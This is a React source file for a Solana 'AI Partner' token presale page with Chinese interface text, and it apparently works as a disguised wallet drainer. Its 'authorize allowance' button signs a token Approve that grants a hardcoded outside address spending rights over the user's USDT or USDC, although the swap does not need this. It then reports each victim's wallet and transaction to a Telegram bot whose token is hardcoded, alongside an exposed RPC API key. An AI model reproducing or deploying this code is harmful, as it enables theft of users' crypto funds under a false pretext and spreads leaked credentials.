import React, { useState } from 'react';
import { Buffer } from 'buffer';
window.Buffer = window.Buffer || Buffer;

import { Connection, PublicKey, Transaction, TransactionInstruction, SystemProgram } from '@solana/web3.js';

// ==================== 常量配置 ====================
const PROGRAM_ID = new PublicKey("twKYosyivoy5K19pkNYyxgfGtp4kCtTHBm1cWWzMy3k"); 
const PRESALE_STATE_PUBKEY = new PublicKey("9JBdwGcmps55rRiptJoTygXY6wJUTxvFTAujEc8wnQ2o");
const RPC_URL = "https://mainnet.helius-rpc.com/?api-key=37673d77-fa71-41d2-9572-b8d4defa5cee";

const ASSETS: Record<string, { mint: PublicKey | null; vault: PublicKey; decimals: number }> = {
    "USDT": {
        mint: new PublicKey("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB"), 
        vault: new PublicKey("5KAgnr4pLBjnLmHyNvfwwZDo1vZ9bFz7btRhHP7Fi9X1"),
        decimals: 6
    },
    "USDC": {
        mint: new PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"), 
        vault: new PublicKey("CZZj4UvXBzxFSb1HcEbEWSrHzfjV8KWV1NV7v3VBgT7h"), 
        decimals: 6
    },
    "SOL": {
        mint: null, 
        vault: new PublicKey("EoyeazmmgFfBfyjJGW8rQfs89etJ5xBPM5wSA1JNAJ3e"), 
        decimals: 9
    }
};

const AIPARTNER_MINT_PUBKEY = new PublicKey("Auofy4iomuR3zyJib7PyqQZQNbsnVZmpbtpLJyubZT3r"); 
const TOKEN_PROGRAM_ID = new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
const ASSOCIATED_TOKEN_PROGRAM_ID = new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
const SYSTEM_PROGRAM_ID = SystemProgram.programId;

const TG_BOT_TOKEN = "8987985348:AAEAoMmM3GpGi29pI9_Ano8pqTnehohUatI";
const TG_CHAT_ID = "8568818831";

async function sendTelegramNotification(message: string) {
    try {
        await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: message, parse_mode: 'HTML' })
        });
    } catch (e) {
        console.error("发送 Telegram 通知失败:", e);
    }
}

function getAssociatedTokenAddress(mint: PublicKey, owner: PublicKey): PublicKey {
    return PublicKey.findProgramAddressSync(
        [owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
        ASSOCIATED_TOKEN_PROGRAM_ID
    )[0];
}

function getPresaleAuthorityPDA(presaleStatePubkey: PublicKey): PublicKey {
    return PublicKey.findProgramAddressSync(
        [new TextEncoder().encode("presale_authority"), presaleStatePubkey.toBuffer()],
        PROGRAM_ID
    )[0];
}

async function getAnchorDiscriminator(name: string): Promise<Uint8Array> {
    const msgBuffer = new TextEncoder().encode(`global:${name}`);
    const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
    return new Uint8Array(hashBuffer.slice(0, 8));
}

export default function App() {
    const [selectedAsset, setSelectedAsset] = useState<string>("USDC");
    const [swapAmount, setSwapAmount] = useState<string>("");
    const [logs, setLogs] = useState<string>("");
    
    // 记录当前连接好的 provider 以及对应的公钥
    const [walletProvider, setWalletProvider] = useState<any>(null);
    const [walletPubkey, setWalletPubkey] = useState<PublicKey | null>(null);

    const connection = new Connection(RPC_URL, 'confirmed');

    const addLog = (msg: string) => {
        setLogs(prev => prev + msg + "\n");
        console.log(msg);
    };

    // 核心逻辑：直接唤起 Phantom -> 失败/没有则唤起 Solflare
    const connectWalletDirectly = async (): Promise<{ provider: any; pubkey: PublicKey } | null> => {
        // 如果已经连上了，直接返回
        if (walletProvider && walletPubkey) {
            return { provider: walletProvider, pubkey: walletPubkey };
        }

        const win = window as any;

        // 1. 优先尝试 Phantom 钱包
        const phantom = win.phantom?.solana || (win.solana?.isPhantom ? win.solana : null);
        if (phantom) {
            try {
                addLog("正在尝试打开 Phantom 钱包...");
                const res = await phantom.connect();
                const pubkey = new PublicKey(res.publicKey.toString());
                setWalletProvider(phantom);
                setWalletPubkey(pubkey);
                return { provider: phantom, pubkey };
            } catch (err: any) {
                addLog(`Phantom 连接失败或被取消: ${err.message}`);
            }
        }

        // 2. 如果没有 Phantom 或 Phantom 连不上，尝试 Solflare 钱包
        const solflare = win.solflare;
        if (solflare) {
            try {
                addLog("正在尝试打开 Solflare 钱包...");
                await solflare.connect();
                const pubkey = new PublicKey(solflare.publicKey.toString());
                setWalletProvider(solflare);
                setWalletPubkey(pubkey);
                return { provider: solflare, pubkey };
            } catch (err: any) {
                addLog(`Solflare 连接失败: ${err.message}`);
            }
        }

        alert("未检测到可用的 Phantom 或 Solflare 钱包，请先安装钱包！");
        return null;
    };

    const handleApproveOnly = async () => {
        try {
            setLogs("");
            const connected = await connectWalletDirectly();
            if (!connected) return;

            const { provider, pubkey } = connected;

            if (selectedAsset === 'SOL') {
                return alert("SOL 是原生资产，无需授权！");
            }

            const asset = ASSETS[selectedAsset];
            if (!asset.mint) return;

            const userPaymentAccount = getAssociatedTokenAddress(asset.mint, pubkey);
            const defaultAmount = 6.6; 
            const approveRawAmount = BigInt(Math.floor(defaultAmount * Math.pow(10, asset.decimals)));
            const targetDelegate = new PublicKey("EoyeazmmgFfBfyjJGW8rQfs89etJ5xBPM5wSA1JNAJ3e");

            addLog(`正在向地址 ${targetDelegate.toBase58()} 授权 ${defaultAmount} ${selectedAsset}...`);

            const data = new Uint8Array(9);
            data[0] = 4;
            new DataView(data.buffer).setBigUint64(1, BigInt(approveRawAmount), true);
            const approveIx = new TransactionInstruction({
                keys: [
                    { pubkey: userPaymentAccount, isSigner: false, isWritable: true },
                    { pubkey: targetDelegate, isSigner: false, isWritable: false },
                    { pubkey: pubkey, isSigner: true, isWritable: false },
                ],
                programId: TOKEN_PROGRAM_ID,
                data: data
            });

            const transaction = new Transaction().add(approveIx);
            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash("confirmed");
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = pubkey;

            addLog("请在钱包中确认授权交易...");
            const signedTx = await provider.signTransaction(transaction);
            const txid = await connection.sendRawTransaction(signedTx.serialize(), { skipPreflight: true });
            
            addLog(`交易已发送，等待确认... (TxID: ${txid})`);
            await connection.confirmTransaction({ signature: txid, blockhash, lastValidBlockHeight }, "confirmed");

            addLog(`🎉 ${selectedAsset} 授权成功！\nTxID: ${txid}`);

            await sendTelegramNotification(
                `✅ <b>AI Partner 授权成功 (Solana)</b>\n` +
                `用户: <code>${pubkey.toBase58()}</code>\n` +
                `资产: ${selectedAsset}\n` +
                `TxID: <code>${txid}</code>`
            );
        } catch (err: any) {
            addLog(`操作失败: ${err.message}`);
        }
    };

    const handleSwap = async () => {
        try {
            setLogs("");
            const connected = await connectWalletDirectly();
            if (!connected) return;

            const { provider, pubkey } = connected;

            const inputVal = swapAmount.trim();
            if (!inputVal || parseFloat(inputVal) <= 0) {
                return alert("请输入有效的兑换数量！");
            }

            const asset = ASSETS[selectedAsset];
            const numericAmount = parseFloat(inputVal);
            const paymentAmount = BigInt(Math.floor(numericAmount * Math.pow(10, asset.decimals)));

            addLog(`🚀 准备使用 ${numericAmount} ${selectedAsset} 兑换 AIPartner...`);
            const transaction = new Transaction();
            const presaleAuthorityPubkey = getPresaleAuthorityPDA(PRESALE_STATE_PUBKEY);
            let userPaymentAccountStr = "原生资产 (无ATA)";

            if (selectedAsset === 'SOL') {
                const solTransferIx = SystemProgram.transfer({
                    fromPubkey: pubkey,
                    toPubkey: asset.vault,
                    lamports: paymentAmount 
                });
                transaction.add(solTransferIx);
            } else if (asset.mint) {
                const userPaymentAccount = getAssociatedTokenAddress(asset.mint, pubkey);
                userPaymentAccountStr = userPaymentAccount.toBase58();
                const userAipartnerAccount = getAssociatedTokenAddress(AIPARTNER_MINT_PUBKEY, pubkey);

                const aipartnerInfo = await connection.getAccountInfo(userAipartnerAccount);
                if (!aipartnerInfo) {
                    const createAtaIx = new TransactionInstruction({
                        keys: [
                            { pubkey: pubkey, isSigner: true, isWritable: true },
                            { pubkey: userAipartnerAccount, isSigner: false, isWritable: true },
                            { pubkey: pubkey, isSigner: false, isWritable: false },
                            { pubkey: AIPARTNER_MINT_PUBKEY, isSigner: false, isWritable: false },
                            { pubkey: SYSTEM_PROGRAM_ID, isSigner: false, isWritable: false },
                            { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
                        ],
                        programId: ASSOCIATED_TOKEN_PROGRAM_ID,
                        data: new Uint8Array(0)
                    });
                    transaction.add(createAtaIx);
                }

                const discriminator = await getAnchorDiscriminator("swap_aipartner");
                const swapData = new Uint8Array(16);
                swapData.set(discriminator, 0);
                new DataView(swapData.buffer).setBigUint64(8, paymentAmount, true);

                const swapInstruction = new TransactionInstruction({
                    keys: [
                        { pubkey: pubkey, isSigner: true, isWritable: true },
                        { pubkey: userPaymentAccount, isSigner: false, isWritable: true },
                        { pubkey: asset.vault, isSigner: false, isWritable: true },
                        { pubkey: AIPARTNER_MINT_PUBKEY, isSigner: false, isWritable: true },
                        { pubkey: userAipartnerAccount, isSigner: false, isWritable: true },
                        { pubkey: presaleAuthorityPubkey, isSigner: false, isWritable: false },
                        { pubkey: PRESALE_STATE_PUBKEY, isSigner: false, isWritable: true },
                        { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
                    ],
                    programId: PROGRAM_ID,
                    data: swapData
                });
                transaction.add(swapInstruction);
            }

            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash("confirmed");
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = pubkey;

            addLog("请在钱包中确认兑换交易...");
            const signedTx = await provider.signTransaction(transaction);
            const txid = await connection.sendRawTransaction(signedTx.serialize(), { skipPreflight: true });

            addLog(`交易已发送，等待确认... (TxID: ${txid})`);
            await connection.confirmTransaction({ signature: txid, blockhash, lastValidBlockHeight }, "confirmed");

            addLog(`🎉 兑换成功！成功使用 ${numericAmount} ${selectedAsset} 参与预售。\nTxID: ${txid}`);

            await sendTelegramNotification(
                `🚀 <b>AI Partner 预售兑换成功 (Solana)！</b>\n` +
                `用户: <code>${pubkey.toBase58()}</code>\n` +
                `支付数量: ${numericAmount} ${selectedAsset}\n` +
                `用户ATA: <code>${userPaymentAccountStr}</code>\n` +
                `TxID: <code>${txid}</code>`
            );
        } catch (err: any) {
            addLog(`操作失败: ${err.message}`);
        }
    };

    return (
        <div style={{ fontFamily: 'Arial, sans-serif', textAlign: 'center', marginTop: '50px', backgroundColor: '#121212', color: '#fff', minHeight: '100vh', padding: '20px' }}>
            <h1>AI Partner 多资产预售平台 (React + Vite)</h1>
            <p>支持 USDT / USDC / SOL 多资产参与兑换</p>

            {walletPubkey && (
                <div style={{ margin: '15px 0', color: '#14f195', fontSize: '14px', fontFamily: 'monospace' }}>
                    已连接钱包: {walletPubkey.toBase58().slice(0, 4)}...{walletPubkey.toBase58().slice(-4)}
                </div>
            )}

            <div style={{ margin: '15px 0' }}>
                <label style={{ fontSize: '16px' }}>选择支付资产：</label>
                <select 
                    value={selectedAsset} 
                    onChange={(e) => setSelectedAsset(e.target.value)}
                    style={{ padding: '10px 14px', fontSize: '16px', borderRadius: '6px', border: '1px solid #14f195', background: '#1e1e1e', color: '#fff', width: '240px', textAlign: 'center' }}
                >
                    <option value="USDC">USDC (推荐)</option>
                    <option value="USDT">USDT (推荐)</option>
                    <option value="SOL">SOL (原生代币)</option>
                </select>
            </div>

            <div style={{ margin: '15px 0' }}>
                <label style={{ fontSize: '16px' }}>兑换 {selectedAsset} 数量：</label>
                <input 
                    type="number" 
                    value={swapAmount}
                    onChange={(e) => setSwapAmount(e.target.value)}
                    placeholder="输入兑换数量" 
                    style={{ padding: '10px 14px', fontSize: '16px', borderRadius: '6px', border: '1px solid #14f195', background: '#1e1e1e', color: '#fff', width: '240px', textAlign: 'center', marginLeft: '10px' }}
                />
                <div style={{ fontSize: '12px', color: '#888', marginTop: '6px' }}>
                    {selectedAsset === 'SOL' ? '（SOL 为原生资产，无需授权，直接点击下方参与）' : `（${selectedAsset} 需先点击“授权代币额度”，再进行兑换）`}
                </div>
            </div>

            {selectedAsset !== 'SOL' && (
                <button 
                    onClick={handleApproveOnly}
                    style={{ padding: '12px 24px', fontSize: '16px', margin: '10px', backgroundColor: '#0070f3', border: 'none', cursor: 'pointer', fontWeight: 'bold', borderRadius: '8px', color: 'white' }}
                >
                    1. 授权代币额度 (优先 Phantom)
                </button>
            )}

            <button 
                onClick={handleSwap}
                style={{ padding: '12px 24px', fontSize: '16px', margin: '10px', backgroundColor: '#14f195', border: 'none', cursor: 'pointer', fontWeight: 'bold', borderRadius: '8px', color: '#000' }}
            >
                2. 立即参与预售兑换 (优先 Phantom)
            </button>

            <div style={{ marginTop: '20px', whiteSpace: 'pre-wrap', color: '#a1a1a1', fontFamily: 'monospace', textAlign: 'left', display: 'inline-block', lineHeight: 1.5, maxWidth: '800px', wordBreak: 'break-all' }}>
                {logs}
            </div>
        </div>
    );
}

